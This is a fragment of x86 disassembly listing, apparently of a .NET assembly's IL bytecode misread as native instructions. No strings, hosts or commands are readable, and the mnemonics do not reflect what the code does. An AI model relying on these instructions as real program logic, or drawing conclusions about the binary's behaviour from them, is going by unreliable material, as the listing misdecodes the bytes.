  403ba3:	1d 00 70 28 30       	sbb    $0x30287000,%eax
  403ba8:	00 00                	add    %al,(%eax)
  403baa:	06                   	push   %es
  403bab:	00 2a                	add    %ch,(%edx)
  403bad:	00 00                	add    %al,(%eax)
  403baf:	00 01                	add    %al,(%ecx)
  403bb1:	10 00                	adc    %al,(%eax)
  403bb3:	00 02                	add    %al,(%edx)
  403bb5:	00 12                	add    %dl,(%edx)
  403bb7:	00 1f                	add    %bl,(%edi)
  403bb9:	31 00                	xor    %eax,(%eax)
  403bbb:	0b 00                	or     (%eax),%eax
  403bbd:	00 00                	add    %al,(%eax)
  403bbf:	00 1b                	add    %bl,(%ebx)
  403bc1:	30 04 00             	xor    %al,(%eax,%eax,1)
  403bc4:	49                   	dec    %ecx
  403bc5:	00 00                	add    %al,(%eax)
  403bc7:	00 09                	add    %cl,(%ecx)
  403bc9:	00 00                	add    %al,(%eax)
  403bcb:	11 00                	adc    %eax,(%eax)
  403bcd:	7e 39                	jle    0x403c08
  403bcf:	00 00                	add    %al,(%eax)
  403bd1:	0a 72 cc             	or     -0x34(%edx),%dh
  403bd4:	1d 00 70 17 6f       	sbb    $0x6f177000,%eax
  403bd9:	38 00                	cmp    %al,(%eax)
  403bdb:	00 0a                	add    %cl,(%edx)
  403bdd:	0a 00                	or     (%eax),%al
  403bdf:	06                   	push   %es
  403be0:	14 fe                	adc    $0xfe,%al
  403be2:	03 0b                	add    (%ebx),%ecx
  403be4:	07                   	pop    %es
  403be5:	2c 13                	sub    $0x13,%al
  403be7:	06                   	push   %es
  403be8:	72 20                	jb     0x403c0a
  403bea:	1e                   	push   %ds
  403beb:	00 70 1a             	add    %dh,0x1a(%eax)
  403bee:	8c 3b                	mov    %?,(%ebx)
  403bf0:	00 00                	add    %al,(%eax)
  403bf2:	01 1a                	add    %ebx,(%edx)
  403bf4:	6f                   	outsl  %ds:(%esi),(%dx)
  403bf5:	40                   	inc    %eax
  403bf6:	00 00                	add    %al,(%eax)
  403bf8:	0a 00                	or     (%eax),%al
  403bfa:	00 de                	add    %bl,%dh
  403bfc:	0b 06                	or     (%esi),%eax
  403bfe:	2c 07                	sub    $0x7,%al
  403c00:	06                   	push   %es
  403c01:	6f                   	outsl  %ds:(%esi),(%dx)
  403c02:	2d 00 00 0a 00       	sub    $0xa0000,%eax
  403c07:	dc 02                	faddl  (%edx)
  403c09:	72 2c                	jb     0x403c37
  403c0b:	1e                   	push   %ds
  403c0c:	00 70 28             	add    %dh,0x28(%eax)
  403c0f:	30 00                	xor    %al,(%eax)
  403c11:	00 06                	add    %al,(%esi)
  403c13:	00 2a                	add    %ch,(%edx)
  403c15:	00 00                	add    %al,(%eax)
  403c17:	00 01                	add    %al,(%ecx)
  403c19:	10 00                	adc    %al,(%eax)
  403c1b:	00 02                	add    %al,(%edx)
  403c1d:	00 12                	add    %dl,(%edx)
  403c1f:	00 1f                	add    %bl,(%edi)
  403c21:	31 00                	xor    %eax,(%eax)
  403c23:	0b 00                	or     (%eax),%eax
  403c25:	00 00                	add    %al,(%eax)
  403c27:	00 1b                	add    %bl,(%ebx)
  403c29:	30 04 00             	xor    %al,(%eax,%eax,1)
  403c2c:	5e                   	pop    %esi
  403c2d:	00 00                	add    %al,(%eax)
  403c2f:	00 09                	add    %cl,(%ecx)
  403c31:	00 00                	add    %al,(%eax)
  403c33:	11 00                	adc    %eax,(%eax)
  403c35:	7e 29                	jle    0x403c60
  403c37:	00 00                	add    %al,(%eax)
  403c39:	0a 72 98             	or     -0x68(%edx),%dh
  403c3c:	0a 00                	or     (%eax),%al
  403c3e:	70 17                	jo     0x403c57
  403c40:	6f                   	outsl  %ds:(%esi),(%dx)
  403c41:	38 00                	cmp    %al,(%eax)
  403c43:	00 0a                	add    %cl,(%edx)
  403c45:	0a 00                	or     (%eax),%al
  403c47:	06                   	push   %es
  403c48:	14 fe                	adc    $0xfe,%al
  403c4a:	03 0b                	add    (%ebx),%ecx
  403c4c:	07                   	pop    %es
  403c4d:	2c 28                	sub    $0x28,%al
  403c4f:	00 06                	add    %al,(%esi)
  403c51:	72 4a                	jb     0x403c9d
  403c53:	1e                   	push   %ds
  403c54:	00 70 17             	add    %dh,0x17(%eax)
  403c57:	8c 3b                	mov    %?,(%ebx)
  403c59:	00 00                	add    %al,(%eax)
  403c5b:	01 1a                	add    %ebx,(%edx)
  403c5d:	6f                   	outsl  %ds:(%esi),(%dx)
  403c5e:	40                   	inc    %eax
  403c5f:	00 00                	add    %al,(%eax)
  403c61:	0a 00                	or     (%eax),%al
  403c63:	06                   	push   %es
  403c64:	72 5e                	jb     0x403cc4
  403c66:	1e                   	push   %ds
  403c67:	00 70 17             	add    %dh,0x17(%eax)
  403c6a:	8c 3b                	mov    %?,(%ebx)
  403c6c:	00 00                	add    %al,(%eax)
  403c6e:	01 1a                	add    %ebx,(%edx)
  403c70:	6f                   	outsl  %ds:(%esi),(%dx)
  403c71:	40                   	inc    %eax
  403c72:	00 00                	add    %al,(%eax)
  403c74:	0a 00                	or     (%eax),%al
  403c76:	00 00                	add    %al,(%eax)
  403c78:	de 0b                	fimuls (%ebx)
  403c7a:	06                   	push   %es
  403c7b:	2c 07                	sub    $0x7,%al
  403c7d:	06                   	push   %es
  403c7e:	6f                   	outsl  %ds:(%esi),(%dx)
  403c7f:	2d 00 00 0a 00       	sub    $0xa0000,%eax
  403c84:	dc 02                	faddl  (%edx)
  403c86:	72 76                	jb     0x403cfe
  403c88:	1e                   	push   %ds
  403c89:	00 70 28             	add    %dh,0x28(%eax)
  403c8c:	30 00                	xor    %al,(%eax)
  403c8e:	00 06                	add    %al,(%esi)
  403c90:	00 2a                	add    %ch,(%edx)
  403c92:	00 00                	add    %al,(%eax)
  403c94:	01 10                	add    %edx,(%eax)
  403c96:	00 00                	add    %al,(%eax)
  403c98:	02 00                	add    (%eax),%al
  403c9a:	12 00                	adc    (%eax),%al
  403c9c:	34 46                	xor    $0x46,%al
  403c9e:	00 0b                	add    %cl,(%ebx)
  403ca0:	00 00                	add    %al,(%eax)
  403ca2:	00 00                	add    %al,(%eax)
  403ca4:	1b 30                	sbb    (%eax),%esi
  403ca6:	04 00                	add    $0x0,%al
  403ca8:	5e                   	pop    %esi
  403ca9:	00 00                	add    %al,(%eax)
  403cab:	00 09                	add    %cl,(%ecx)
  403cad:	00 00                	add    %al,(%eax)
  403caf:	11 00                	adc    %eax,(%eax)
  403cb1:	7e 29                	jle    0x403cdc
  403cb3:	00 00                	add    %al,(%eax)
  403cb5:	0a 72 98             	or     -0x68(%edx),%dh
  403cb8:	0a 00                	or     (%eax),%al
  403cba:	70 17                	jo     0x403cd3
  403cbc:	6f                   	outsl  %ds:(%esi),(%dx)
  403cbd:	38 00                	cmp    %al,(%eax)
  403cbf:	00 0a                	add    %cl,(%edx)
  403cc1:	0a 00                	or     (%eax),%al
  403cc3:	06                   	push   %es
  403cc4:	14 fe                	adc    $0xfe,%al
  403cc6:	03 0b                	add    (%ebx),%ecx
  403cc8:	07                   	pop    %es
  403cc9:	2c 28                	sub    $0x28,%al
  403ccb:	00 06                	add    %al,(%esi)
  403ccd:	72 a6                	jb     0x403c75
  403ccf:	1e                   	push   %ds
  403cd0:	00 70 15             	add    %dh,0x15(%eax)
  403cd3:	8c 49 00             	mov    %cs,0x0(%ecx)
  403cd6:	00 01                	add    %al,(%ecx)
  403cd8:	1a 6f 40             	sbb    0x40(%edi),%ch
  403cdb:	00 00                	add    %al,(%eax)
  403cdd:	0a 00                	or     (%eax),%al
  403cdf:	06                   	push   %es
  403ce0:	72 b8                	jb     0x403c9a
  403ce2:	1e                   	push   %ds
  403ce3:	00 70 15             	add    %dh,0x15(%eax)
  403ce6:	8c 49 00             	mov    %cs,0x0(%ecx)
  403ce9:	00 01                	add    %al,(%ecx)
  403ceb:	1a 6f 40             	sbb    0x40(%edi),%ch
  403cee:	00 00                	add    %al,(%eax)
  403cf0:	0a 00                	or     (%eax),%al
  403cf2:	00 00                	add    %al,(%eax)
  403cf4:	de 0b                	fimuls (%ebx)
  403cf6:	06                   	push   %es
  403cf7:	2c 07                	sub    $0x7,%al
  403cf9:	06                   	push   %es
  403cfa:	6f                   	outsl  %ds:(%esi),(%dx)
  403cfb:	2d 00 00 0a 00       	sub    $0xa0000,%eax
  403d00:	dc 02                	faddl  (%edx)
  403d02:	72 d4                	jb     0x403cd8
  403d04:	1e                   	push   %ds
  403d05:	00 70 28             	add    %dh,0x28(%eax)
  403d08:	30 00                	xor    %al,(%eax)
  403d0a:	00 06                	add    %al,(%esi)
  403d0c:	00 2a                	add    %ch,(%edx)
  403d0e:	00 00                	add    %al,(%eax)
  403d10:	01 10                	add    %edx,(%eax)
  403d12:	00 00                	add    %al,(%eax)
  403d14:	02 00                	add    (%eax),%al
  403d16:	12 00                	adc    (%eax),%al
  403d18:	34 46                	xor    $0x46,%al
  403d1a:	00 0b                	add    %cl,(%ebx)
  403d1c:	00 00                	add    %al,(%eax)
  403d1e:	00 00                	add    %al,(%eax)
  403d20:	13 30                	adc    (%eax),%esi
  403d22:	05 00 b2 00 00       	add    $0xb200,%eax
  403d27:	00 11                	add    %dl,(%ecx)
  403d29:	00 00                	add    %al,(%eax)
  403d2b:	11 00                	adc    %eax,(%eax)
  403d2d:	73 31                	jae    0x403d60
  403d2f:	00 00                	add    %al,(%eax)
  403d31:	0a 25 17 6f 36 00    	or     0x366f17,%ah
  403d37:	00 0a                	add    %cl,(%edx)
  403d39:	00 25 18 6f 32 00    	add    %ah,0x326f18
  403d3f:	00 0a                	add    %cl,(%edx)
  403d41:	00 25 16 6f 35 00    	add    %ah,0x356f16
  403d47:	00 0a                	add    %cl,(%edx)
  403d49:	00 25 28 64 00 00    	add    %ah,0x6428
  403d4f:	0a 6f 69             	or     0x69(%edi),%ch
  403d52:	00 00                	add    %al,(%eax)
  403d54:	0a 00                	or     (%eax),%al
  403d56:	25 23 cd cc cc       	and    $0xcccccd23,%eax
  403d5b:	cc                   	int3
  403d5c:	cc                   	int3
  403d5d:	cc                   	int3
  403d5e:	ec                   	in     (%dx),%al
  403d5f:	3f                   	aas
  403d60:	6f                   	outsl  %ds:(%esi),(%dx)
  403d61:	34 00                	xor    $0x0,%al
  403d63:	00 0a                	add    %cl,(%edx)
  403d65:	00 25 16 6f 33 00    	add    %ah,0x336f16
  403d6b:	00 0a                	add    %cl,(%edx)
  403d6d:	00 25 16 6f 6a 00    	add    %ah,0x6a6f16
  403d73:	00 0a                	add    %cl,(%edx)
  403d75:	00 0a                	add    %cl,(%edx)
  403d77:	73 6b                	jae    0x403de4
  403d79:	00 00                	add    %al,(%eax)
  403d7b:	0a 25 72 04 1f 00    	or     0x1f0472,%ah
  403d81:	70 6f                	jo     0x403df2
  403d83:	6c                   	insb   (%dx),%es:(%edi)
  403d84:	00 00                	add    %al,(%eax)
  403d86:	0a 00                	or     (%eax),%al
  403d88:	25 28 6d 00 00       	and    $0x6d28,%eax
  403d8d:	0a 6f 6e             	or     0x6e(%edi),%ch
  403d90:	00 00                	add    %al,(%eax)
  403d92:	0a 00                	or     (%eax),%al
  403d94:	25 28 64 00 00       	and    $0x6428,%eax
  403d99:	0a 6f 69             	or     0x69(%edi),%ch
  403d9c:	00 00                	add    %al,(%eax)
  403d9e:	0a 00                	or     (%eax),%al
  403da0:	25 72 a7 1f 00       	and    $0x1fa772,%eax
  403da5:	70 22                	jo     0x403dc9
  403da7:	00 00                	add    %al,(%eax)
  403da9:	c0 41 17 73          	rolb   $0x73,0x17(%ecx)
  403dad:	6f                   	outsl  %ds:(%esi),(%dx)
  403dae:	00 00                	add    %al,(%eax)
  403db0:	0a 6f 70             	or     0x70(%edi),%ch
  403db3:	00 00                	add    %al,(%eax)
  403db5:	0a 00                	or     (%eax),%al
  403db7:	25 1f 20 6f 71       	and    $0x716f201f,%eax
  403dbc:	00 00                	add    %al,(%eax)
  403dbe:	0a 00                	or     (%eax),%al
  403dc0:	25 1b 6f 72 00       	and    $0x726f1b,%eax
  403dc5:	00 0a                	add    %cl,(%edx)
  403dc7:	00 0b                	add    %cl,(%ebx)
  403dc9:	06                   	push   %es
  403dca:	6f                   	outsl  %ds:(%esi),(%dx)
  403dcb:	73 00                	jae    0x403dcd
  403dcd:	00 0a                	add    %cl,(%edx)
  403dcf:	07                   	pop    %es
  403dd0:	6f                   	outsl  %ds:(%esi),(%dx)
  403dd1:	74 00                	je     0x403dd3
  403dd3:	00 0a                	add    %cl,(%edx)
  403dd5:	00 06                	add    %al,(%esi)
  403dd7:	6f                   	outsl  %ds:(%esi),(%dx)
  403dd8:	75 00                	jne    0x403dda
  403dda:	00 0a                	add    %cl,(%edx)
  403ddc:	26 2a 00             	sub    %es:(%eax),%al
  403ddf:	00 13                	add    %dl,(%ebx)
  403de1:	30 05 00 3e 00 00    	xor    %al,0x3e00
  403de7:	00 12                	add    %dl,(%edx)
  403de9:	00 00                	add    %al,(%eax)
  403deb:	11 00                	adc    %eax,(%eax)
  403ded:	02 28                	add    (%eax),%ch
  403def:	2e 00 00             	add    %al,%cs:(%eax)
  403df2:	06                   	push   %es
  403df3:	0a 72 b3             	or     -0x4d(%edx),%dh
  403df6:	1f                   	pop    %ds
  403df7:	00 70 1a             	add    %dh,0x1a(%eax)
  403dfa:	8d 12                	lea    (%edx),%edx
  403dfc:	00 00                	add    %al,(%eax)
  403dfe:	01 25 16 28 76 00    	add    %esp,0x762816
  403e04:	00 0a                	add    %cl,(%edx)
  403e06:	a2 25 17 28 77       	mov    %al,0x77281725
  403e0b:	00 00                	add    %al,(%eax)
  403e0d:	0a a2 25 18 28 78    	or     0x78281825(%edx),%ah
  403e13:	00 00                	add    %al,(%eax)
  403e15:	0a a2 25 19 06 a2    	or     -0x5df9e6db(%edx),%ah
  403e1b:	28 79 00             	sub    %bh,0x0(%ecx)
  403e1e:	00 0a                	add    %cl,(%edx)
  403e20:	0b 02                	or     (%edx),%eax
  403e22:	07                   	pop    %es
  403e23:	28 30                	sub    %dh,(%eax)
  403e25:	00 00                	add    %al,(%eax)
  403e27:	06                   	push   %es
  403e28:	00 2a                	add    %ch,(%edx)
  403e2a:	00 00                	add    %al,(%eax)
  403e2c:	1b 30                	sbb    (%eax),%esi
  403e2e:	02 00                	add    (%eax),%al
  403e30:	32 00                	xor    (%eax),%al
  403e32:	00 00                	add    %al,(%eax)
  403e34:	13 00                	adc    (%eax),%eax
  403e36:	00 11                	add    %dl,(%ecx)
  403e38:	00 00                	add    %al,(%eax)
  403e3a:	73 7a                	jae    0x403eb6
  403e3c:	00 00                	add    %al,(%eax)
  403e3e:	0a 0a                	or     (%edx),%cl
  403e40:	06                   	push   %es
  403e41:	72 a4                	jb     0x403de7
  403e43:	20 00                	and    %al,(%eax)
  403e45:	70 6f                	jo     0x403eb6
  403e47:	7b 00                	jnp    0x403e49
  403e49:	00 0a                	add    %cl,(%edx)
  403e4b:	6f                   	outsl  %ds:(%esi),(%dx)
  403e4c:	7c 00                	jl     0x403e4e
  403e4e:	00 0a                	add    %cl,(%edx)
  403e50:	0b de                	or     %esi,%ebx
  403e52:	15 06 2c 07 06       	adc    $0x6072c06,%eax
  403e57:	6f                   	outsl  %ds:(%esi),(%dx)
  403e58:	2d 00 00 0a 00       	sub    $0xa0000,%eax
  403e5d:	dc 26                	fsubl  (%esi)
  403e5f:	00 72 d0             	add    %dh,-0x30(%edx)
  403e62:	20 00                	and    %al,(%eax)
  403e64:	70 0b                	jo     0x403e71
  403e66:	de 00                	fiadds (%eax)
  403e68:	07                   	pop    %es
  403e69:	2a 00                	sub    (%eax),%al
  403e6b:	00 01                	add    %al,(%ecx)
  403e6d:	1c 00                	sbb    $0x0,%al
  403e6f:	00 02                	add    %al,(%edx)
  403e71:	00 08                	add    %cl,(%eax)
  403e73:	00 13                	add    %dl,(%ebx)
  403e75:	1b 00                	sbb    (%eax),%eax
  403e77:	0b 00                	or     (%eax),%eax
  403e79:	00 00                	add    %al,(%eax)
  403e7b:	00 00                	add    %al,(%eax)
  403e7d:	00 01                	add    %al,(%ecx)
  403e7f:	00 25 26 00 0a 12    	add    %ah,0x120a0026
  403e85:	00 00                	add    %al,(%eax)
  403e87:	01 1b                	add    %ebx,(%ebx)
  403e89:	30 06                	xor    %al,(%esi)
  403e8b:	00 95 00 00 00 14    	add    %dl,0x14000000(%ebp)
  403e91:	00 00                	add    %al,(%eax)
  403e93:	11 00                	adc    %eax,(%eax)
  403e95:	00 28                	add    %ch,(%eax)
  403e97:	4b                   	dec    %ebx
  403e98:	00 00                	add    %al,(%eax)
  403e9a:	0a 72 e0             	or     -0x20(%edx),%dh
  403e9d:	20 00                	and    %al,(%eax)
  403e9f:	70 28                	jo     0x403ec9
  403ea1:	3f                   	aas
  403ea2:	00 00                	add    %al,(%eax)
  403ea4:	0a 0a                	or     (%edx),%cl
  403ea6:	28 7d 00             	sub    %bh,0x0(%ebp)
  403ea9:	00 0a                	add    %cl,(%edx)
  403eab:	6f                   	outsl  %ds:(%esi),(%dx)
  403eac:	7e 00                	jle    0x403eae
  403eae:	00 0a                	add    %cl,(%edx)
  403eb0:	0c 12                	or     $0x12,%al
  403eb2:	02 28                	add    (%eax),%ch
  403eb4:	7f 00                	jg     0x403eb6
  403eb6:	00 0a                	add    %cl,(%edx)
  403eb8:	28 7d 00             	sub    %bh,0x0(%ebp)
  403ebb:	00 0a                	add    %cl,(%edx)
  403ebd:	6f                   	outsl  %ds:(%esi),(%dx)
  403ebe:	7e 00                	jle    0x403ec0
  403ec0:	00 0a                	add    %cl,(%edx)
  403ec2:	0c 12                	or     $0x12,%al
  403ec4:	02 28                	add    (%eax),%ch
  403ec6:	80 00 00             	addb   $0x0,(%eax)
  403ec9:	0a 73 62             	or     0x62(%ebx),%dh
  403ecc:	00 00                	add    %al,(%eax)
  403ece:	0a 0b                	or     (%ebx),%cl
  403ed0:	00 07                	add    %al,(%edi)
  403ed2:	28 63 00             	sub    %ah,0x0(%ebx)
  403ed5:	00 0a                	add    %cl,(%edx)
  403ed7:	0d 09 16 16 16       	or     $0x16161609,%eax
  403edc:	16                   	push   %ss
  403edd:	07                   	pop    %es
  403ede:	6f                   	outsl  %ds:(%esi),(%dx)
  403edf:	81 00 00 0a 6f 82    	addl   $0x826f0a00,(%eax)
  403ee5:	00 00                	add    %al,(%eax)
  403ee7:	0a 00                	or     (%eax),%al
  403ee9:	de 0b                	fimuls (%ebx)
  403eeb:	09 2c 07             	or     %ebp,(%edi,%eax,1)
  403eee:	09 6f 2d             	or     %ebp,0x2d(%edi)
  403ef1:	00 00                	add    %al,(%eax)
  403ef3:	0a 00                	or     (%eax),%al
  403ef5:	dc 07                	faddl  (%edi)
  403ef7:	06                   	push   %es
  403ef8:	28 83 00 00 0a 6f    	sub    %al,0x6f0a0000(%ebx)
  403efe:	67 00 00             	add    %al,(%bx,%si)
  403f01:	0a 00                	or     (%eax),%al
  403f03:	00 de                	add    %bl,%dh
  403f05:	0b 07                	or     (%edi),%eax
  403f07:	2c 07                	sub    $0x7,%al
  403f09:	07                   	pop    %es
  403f0a:	6f                   	outsl  %ds:(%esi),(%dx)
  403f0b:	2d 00 00 0a 00       	sub    $0xa0000,%eax
  403f10:	dc 02                	faddl  (%edx)
  403f12:	06                   	push   %es
  403f13:	28 31                	sub    %dh,(%ecx)
  403f15:	00 00                	add    %al,(%eax)
  403f17:	06                   	push   %es
  403f18:	00 06                	add    %al,(%esi)
  403f1a:	28 84 00 00 0a 00 00 	sub    %al,0xa00(%eax,%eax,1)
  403f21:	de 05 26 00 00 de    	fiadds 0xde000026
  403f27:	00 2a                	add    %ch,(%edx)
  403f29:	00 00                	add    %al,(%eax)
  403f2b:	00 01                	add    %al,(%ecx)
  403f2d:	28 00                	sub    %al,(%eax)
  403f2f:	00 02                	add    %al,(%edx)
  403f31:	00 44 00 13          	add    %al,0x13(%eax,%eax,1)
  403f35:	57                   	push   %edi
  403f36:	00 0b                	add    %cl,(%ebx)
  403f38:	00 00                	add    %al,(%eax)
  403f3a:	00 00                	add    %al,(%eax)
  403f3c:	02 00                	add    (%eax),%al
  403f3e:	3c 00                	cmp    $0x0,%al
  403f40:	36 72 00             	ss jb  0x403f43
  403f43:	0b 00                	or     (%eax),%eax
  403f45:	00 00                	add    %al,(%eax)
  403f47:	00 00                	add    %al,(%eax)
  403f49:	00 01                	add    %al,(%ecx)
  403f4b:	00 8e 8f 00 05 12    	add    %cl,0x1205008f(%esi)
  403f51:	00 00                	add    %al,(%eax)
  403f53:	01 1b                	add    %ebx,(%ebx)
  403f55:	30 03                	xor    %al,(%ebx)
  403f57:	00 37                	add    %dh,(%edi)
  403f59:	00 00                	add    %al,(%eax)
  403f5b:	00 15 00 00 11 00    	add    %dl,0x110000
  403f61:	00 72 fe             	add    %dh,-0x2(%edx)
  403f64:	20 00                	and    %al,(%eax)
  403f66:	70 0a                	jo     0x403f72
  403f68:	72 ad                	jb     0x403f17
  403f6a:	21 00                	and    %eax,(%eax)
  403f6c:	70 03                	jo     0x403f71
  403f6e:	72 c3                	jb     0x403f33
  403f70:	21 00                	and    %eax,(%eax)
  403f72:	70 73                	jo     0x403fe7
  403f74:	85 00                	test   %eax,(%eax)
  403f76:	00 0a                	add    %cl,(%edx)
  403f78:	0b 73 7a             	or     0x7a(%ebx),%esi
  403f7b:	00 00                	add    %al,(%eax)
  403f7d:	0a 0c 00             	or     (%eax,%eax,1),%cl
  403f80:	00 de                	add    %bl,%dh
  403f82:	0b 08                	or     (%eax),%ecx
  403f84:	2c 07                	sub    $0x7,%al
  403f86:	08 6f 2d             	or     %ch,0x2d(%edi)
  403f89:	00 00                	add    %al,(%eax)
  403f8b:	0a 00                	or     (%eax),%al
  403f8d:	dc 00                	faddl  (%eax)
  403f8f:	de 05 26 00 00 de    	fiadds 0xde000026
  403f95:	00 2a                	add    %ch,(%edx)
  403f97:	00 01                	add    %al,(%ecx)
  403f99:	1c 00                	sbb    $0x0,%al
  403f9b:	00 02                	add    %al,(%edx)
  403f9d:	00 1f                	add    %bl,(%edi)
  403f9f:	00 04 23             	add    %al,(%ebx,%eiz,1)
  403fa2:	00 0b                	add    %cl,(%ebx)
  403fa4:	00 00                	add    %al,(%eax)
  403fa6:	00 00                	add    %al,(%eax)
  403fa8:	00 00                	add    %al,(%eax)
  403faa:	01 00                	add    %eax,(%eax)
  403fac:	30 31                	xor    %dh,(%ecx)
  403fae:	00 05 12 00 00 01    	add    %al,0x1000012
  403fb4:	1b 30                	sbb    (%eax),%esi
  403fb6:	04 00                	add    $0x0,%al
  403fb8:	5a                   	pop    %edx
  403fb9:	01 00                	add    %eax,(%eax)
  403fbb:	00 16                	add    %dl,(%esi)
  403fbd:	00 00                	add    %al,(%eax)
  403fbf:	11 00                	adc    %eax,(%eax)
  403fc1:	00 72 cd             	add    %dh,-0x33(%edx)
  403fc4:	21 00                	and    %eax,(%eax)
  403fc6:	70 0a                	jo     0x403fd2
  403fc8:	73 7a                	jae    0x404044
  403fca:	00 00                	add    %al,(%eax)
  403fcc:	0a 0b                	or     (%ebx),%cl
  403fce:	00 72 7e             	add    %dh,0x7e(%edx)
  403fd1:	22 00                	and    (%eax),%al
  403fd3:	70 28                	jo     0x403ffd
  403fd5:	86 00                	xchg   %al,(%eax)
  403fd7:	00 0a                	add    %cl,(%edx)
  403fd9:	0d 12 03 28 87       	or     $0x87280312,%eax
  403fde:	00 00                	add    %al,(%eax)
  403fe0:	0a 8c 54 00 00 01 28 	or     0x28010000(%esp,%edx,2),%cl
  403fe7:	5a                   	pop    %edx
  403fe8:	00 00                	add    %al,(%eax)
  403fea:	0a 0c 07             	or     (%edi,%eax,1),%cl
  403fed:	6f                   	outsl  %ds:(%esi),(%dx)
  403fee:	88 00                	mov    %al,(%eax)
  403ff0:	00 0a                	add    %cl,(%edx)
  403ff2:	1f                   	pop    %ds
  403ff3:	0c 72                	or     $0x72,%al
  403ff5:	be 22 00 70 08       	mov    $0x8700022,%esi
  403ffa:	28 3f                	sub    %bh,(%edi)
  403ffc:	00 00                	add    %al,(%eax)
  403ffe:	0a 6f 89             	or     -0x77(%edi),%ch
  404001:	00 00                	add    %al,(%eax)
  404003:	0a 00                	or     (%eax),%al
  404005:	73 8a                	jae    0x403f91
  404007:	00 00                	add    %al,(%eax)
  404009:	0a 13                	or     (%ebx),%dl
  40400b:	04 00                	add    $0x0,%al
  40400d:	28 8b 00 00 0a 72    	sub    %cl,0x720a0000(%ebx)
  404013:	fc                   	cld
  404014:	22 00                	and    (%eax),%al
  404016:	70 08                	jo     0x404020
  404018:	72 0e                	jb     0x404028
  40401a:	08 00                	or     %al,(%eax)
  40401c:	70 28                	jo     0x404046
  40401e:	3c 00                	cmp    $0x0,%al
  404020:	00 0a                	add    %cl,(%edx)
  404022:	6f                   	outsl  %ds:(%esi),(%dx)
  404023:	8c 00                	mov    %es,(%eax)
  404025:	00 0a                	add    %cl,(%edx)
  404027:	13 05 28 8b 00 00    	adc    0x8b28,%eax
  40402d:	0a 72 fc             	or     -0x4(%edx),%dh
  404030:	22 00                	and    (%eax),%al
  404032:	70 08                	jo     0x40403c
  404034:	72 06                	jb     0x40403c
  404036:	23 00                	and    (%eax),%eax
  404038:	70 28                	jo     0x404062
  40403a:	3c 00                	cmp    $0x0,%al
  40403c:	00 0a                	add    %cl,(%edx)
  40403e:	6f                   	outsl  %ds:(%esi),(%dx)
  40403f:	8c 00                	mov    %es,(%eax)
  404041:	00 0a                	add    %cl,(%edx)
  404043:	13 06                	adc    (%esi),%eax
  404045:	72 10                	jb     0x404057
  404047:	23 00                	and    (%eax),%eax
  404049:	70 13                	jo     0x40405e
  40404b:	07                   	pop    %es
  40404c:	11 04 11             	adc    %eax,(%ecx,%edx,1)
  40404f:	05 16 11 05 8e       	add    $0x8e051116,%eax
  404054:	69 6f 8d 00 00 0a 00 	imul   $0xa0000,-0x73(%edi),%ebp
  40405b:	11 04 28             	adc    %eax,(%eax,%ebp,1)
  40405e:	8b 00                	mov    (%eax),%eax
  404060:	00 0a                	add    %cl,(%edx)
  404062:	11 07                	adc    %eax,(%edi)
  404064:	6f                   	outsl  %ds:(%esi),(%dx)
  404065:	8c 00                	mov    %es,(%eax)
  404067:	00 0a                	add    %cl,(%edx)
  404069:	16                   	push   %ss
  40406a:	11 07                	adc    %eax,(%edi)
  40406c:	6f                   	outsl  %ds:(%esi),(%dx)
  40406d:	8e 00                	mov    (%eax),%es
  40406f:	00 0a                	add    %cl,(%edx)
  404071:	6f                   	outsl  %ds:(%esi),(%dx)
  404072:	8d 00                	lea    (%eax),%eax
  404074:	00 0a                	add    %cl,(%edx)
  404076:	00 03                	add    %al,(%ebx)
  404078:	28 8f 00 00 0a 13    	sub    %cl,0x130a0000(%edi)
  40407e:	08 72 8a             	or     %dh,-0x76(%edx)
  404081:	23 00                	and    (%eax),%eax
  404083:	70 03                	jo     0x404088
  404085:	28 30                	sub    %dh,(%eax)
  404087:	00 00                	add    %al,(%eax)
  404089:	0a 72 02             	or     0x2(%edx),%dh
  40408c:	24 00                	and    $0x0,%al
  40408e:	70 28                	jo     0x4040b8
  404090:	3c 00                	cmp    $0x0,%al
  404092:	00 0a                	add    %cl,(%edx)
  404094:	13 09                	adc    (%ecx),%ecx
  404096:	11 04 11             	adc    %eax,(%ecx,%edx,1)
  404099:	05 16 11 05 8e       	add    $0x8e051116,%eax
  40409e:	69 6f 8d 00 00 0a 00 	imul   $0xa0000,-0x73(%edi),%ebp
  4040a5:	11 04 28             	adc    %eax,(%eax,%ebp,1)
  4040a8:	8b 00                	mov    (%eax),%eax
  4040aa:	00 0a                	add    %cl,(%edx)
  4040ac:	11 09                	adc    %ecx,(%ecx)
  4040ae:	6f                   	outsl  %ds:(%esi),(%dx)
  4040af:	8c 00                	mov    %es,(%eax)
  4040b1:	00 0a                	add    %cl,(%edx)
  4040b3:	16                   	push   %ss
  4040b4:	11 09                	adc    %ecx,(%ecx)
  4040b6:	6f                   	outsl  %ds:(%esi),(%dx)
  4040b7:	8e 00                	mov    (%eax),%es
  4040b9:	00 0a                	add    %cl,(%edx)
  4040bb:	6f                   	outsl  %ds:(%esi),(%dx)
  4040bc:	8d 00                	lea    (%eax),%eax
  4040be:	00 0a                	add    %cl,(%edx)
  4040c0:	00 11                	add    %dl,(%ecx)
  4040c2:	04 11                	add    $0x11,%al
  4040c4:	08 16                	or     %dl,(%esi)
  4040c6:	11 08                	adc    %ecx,(%eax)
  4040c8:	8e 69 6f             	mov    0x6f(%ecx),%gs
  4040cb:	8d 00                	lea    (%eax),%eax
  4040cd:	00 0a                	add    %cl,(%edx)
  4040cf:	00 11                	add    %dl,(%ecx)
  4040d1:	04 11                	add    $0x11,%al
  4040d3:	06                   	push   %es
  4040d4:	16                   	push   %ss
  4040d5:	11 06                	adc    %eax,(%esi)
  4040d7:	8e 69 6f             	mov    0x6f(%ecx),%gs
  4040da:	8d 00                	lea    (%eax),%eax
  4040dc:	00 0a                	add    %cl,(%edx)
  4040de:	00 07                	add    %al,(%edi)
  4040e0:	06                   	push   %es
  4040e1:	72 40                	jb     0x404123
  4040e3:	24 00                	and    $0x0,%al
  4040e5:	70 11                	jo     0x4040f8
  4040e7:	04 6f                	add    $0x6f,%al
  4040e9:	90                   	nop
  4040ea:	00 00                	add    %al,(%eax)
  4040ec:	0a 6f 91             	or     -0x6f(%edi),%ch
  4040ef:	00 00                	add    %al,(%eax)
  4040f1:	0a 26                	or     (%esi),%ah
  4040f3:	00 de                	add    %bl,%dh
  4040f5:	0d 11 04 2c 08       	or     $0x82c0411,%eax
  4040fa:	11 04 6f             	adc    %eax,(%edi,%ebp,2)
  4040fd:	2d 00 00 0a 00       	sub    $0xa0000,%eax
  404102:	dc 00                	faddl  (%eax)
